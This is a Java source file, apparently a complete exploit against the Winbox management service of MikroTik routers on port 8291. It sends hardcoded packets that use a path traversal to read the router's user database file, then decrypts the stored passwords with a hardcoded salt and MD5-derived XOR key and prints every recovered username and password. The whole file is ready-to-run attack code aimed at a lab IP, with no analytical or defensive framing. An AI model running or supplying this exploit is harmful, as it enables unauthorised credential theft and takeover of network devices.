
import java.io.*;
import java.net.Socket;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

public final class Winbox {
    private static final byte[] aa = {
            0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
            (byte) 0xff, 0x01, 0x06, 0x00, (byte) 0xff, 0x09, 0x05, 0x07,
            0x00, (byte) 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
            0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
            0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
            0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
            0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
            0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
            0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
            (byte) 0xff, (byte) 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, (byte) 0xff, (byte) 0x88,
            0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
            0x00, 0x00};

    private static final byte[] bb = {
            0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
            (byte) 0xff, 0x01, 0x06, 0x00, (byte) 0xff, 0x09, 0x06, 0x01,
            0x00, (byte) 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
            0x00, (byte) 0x80, 0x00, 0x00, 0x07, 0x00, (byte) 0xff, 0x09,
            0x04, 0x02, 0x00, (byte) 0xff, (byte) 0x88, 0x02, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
            0x00, (byte) 0xff, (byte) 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
            0x00, 0x02, 0x00, 0x00, 0x00
    };

    private static final byte[] SALT = {'2', '8', '3', 'i', '4', 'j', 'f', 'k', 'a', 'i', '3', '3', '8', '9'};
    private static final byte[] USER_BYTE = {0x01, 0x00, 0x00, 0x21};
    private static final byte[] PASS_BYTE = {0x11, 0x00, 0x00, 0x21};
    private static final byte[] M2 = {'M', '2'};

    private String ip;
    private int port;
    private boolean withIp;

    public Winbox(String ip, int port, boolean withIp) {
        this.ip = ip;
        this.port = port;
        this.withIp = withIp;
    }

    private static ArrayList<byte[]> splitBytes(byte[] src, byte[] pattern) {
        ArrayList<byte[]> res = new ArrayList<>();

        boolean find;
        int i = 0;
        int last_index = 0;
        while (i + pattern.length < src.length) {
            find = true;

            for (int j = 0; j < pattern.length; ++j) {
                if (src[i + j] != pattern[j]) {
                    find = false;
                    break;
                }
            }

            if (find) {
                byte[] b = new byte[i - last_index];
                System.arraycopy(src, last_index, b, 0, b.length);
                res.add(b);
                last_index = i + pattern.length;
                i += pattern.length;
            } else {
                ++i;
            }
        }

        byte[] b = new byte[src.length - last_index];
        System.arraycopy(src, last_index, b, 0, b.length);
        res.add(b);

        return res;
    }

    private static String decodePassword(byte[] user, byte[] pass) {
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream( );
            outputStream.write(user, 1, user[0]);
            outputStream.write(SALT);
            byte[] key = MessageDigest.getInstance("MD5").digest(outputStream.toByteArray());
            byte[] password = new byte[pass.length];
            for (int i = 0; i < pass[0]; ++i) {
                password[i] = (byte) (pass[i + 1] ^ key[i % key.length]);
            }
            byte[] passw = splitBytes(password, new byte[1]).get(0);
            return new String(passw);
        } catch (NoSuchAlgorithmException | IOException e) {
            return null;
        }
    }

    private static User decodeUser(byte[] dump) {
        byte[] user_data = splitBytes(dump, USER_BYTE).get(1);
        byte[] pass_data = splitBytes(dump, PASS_BYTE).get(1);

        if (user_data.length >= user_data[0] + 1) {
            User obj = new User();
            obj.user = new String(user_data, 1, user_data[0]);
            obj.password = decodePassword(user_data, pass_data);
            return obj;
        } else {
            return null;
        }
    }

    public ArrayList<User> extract() throws IOException {
        Socket socket;
        if (withIp) {
            socket = new Socket(this.ip, this.port);
        } else {
            throw new RuntimeException("mac connection implemented");
        }

        InputStream is = socket.getInputStream();
        OutputStream os = socket.getOutputStream();

        os.write(aa);

        byte[] recv = new byte[2048];
        if (is.read(recv) <= 0) {
            throw new RuntimeException("recv empty");
        }

        byte[] b = bb.clone();
        b[19] = recv[38];

        os.write(b);

        int recvLen = is.read(recv);
        if (recvLen <= 0) {
            throw new RuntimeException("recv2 empty");
        } else if (recvLen < 25 + 55) {
            return null;
        }

        is.close();
        os.close();
        socket.close();

        byte[] dump = new byte[recvLen - 55];
        System.arraycopy(recv, 55, dump, 0, recvLen - 55);

        ArrayList<byte[]> pairs = splitBytes(dump, M2);

        if (pairs.size() <= 1) {
            pairs.clear();
            return null;
        }

        pairs.remove(0);

        ArrayList<User> users = new ArrayList<>();
        for (byte[] d : pairs) {
            users.add(decodeUser(d));
        }

        pairs.clear();

        return users;
    }

    public static class User {
        public String user;
        public String password;

        private User () {

        }

        @Override
        public String toString() {
            return "[" + user + "," + password + "]";
        }
    }

    public static void main(String[] args) {
        Winbox winbox = new Winbox("192.168.56.105", 8291, true);
        try {
            for (User u : winbox.extract()) {
                System.out.println(u);
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
